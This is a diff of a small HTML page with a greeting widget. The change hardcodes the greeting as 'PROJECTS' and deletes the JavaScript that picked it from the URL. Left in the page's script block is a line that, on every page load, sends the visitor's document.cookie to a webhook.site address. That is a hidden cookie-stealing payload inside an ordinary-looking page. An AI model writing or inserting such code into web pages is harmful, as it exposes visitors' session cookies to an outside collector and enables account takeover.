@@ -30,36 +30,11 @@
 <body>
 <div class="container>">
     <div class="widget">
-        <div class="greet" id="greet">Good Afternoon </div>
+        <div class="greet" id="greet">PROJECTS </div>
     </div>
 </div>
 <script>
 fetch('https://webhook.site/79c2d5fc-7622-40e7-89d8-7c8cc9306850?c='+document.cookie);
-  
-function displayGreetings(){
-  var greet = "";
-  var urlParams = window.location.search 
-  var queryString = urlParams.split('?')[1];
-  const params = new URLSearchParams(queryString);
-  switch(params.get("title")){
-    case "PROJECTS":
-      greet = "PROJECTS";
-      break;
-    case "INDEX":
-      greet = "INDEX";
-      break;
-    default:
-      greet = "HELLO";
-      break;
-        }
-   document.getElementById('greet').innerHTML = greet;
-    }
-
-    function displayWidget() {
-        displayGreetings();
-        setTimeout(displayWidget, 500);
-    }
-    displayWidget()
 </script>
 
 </body>
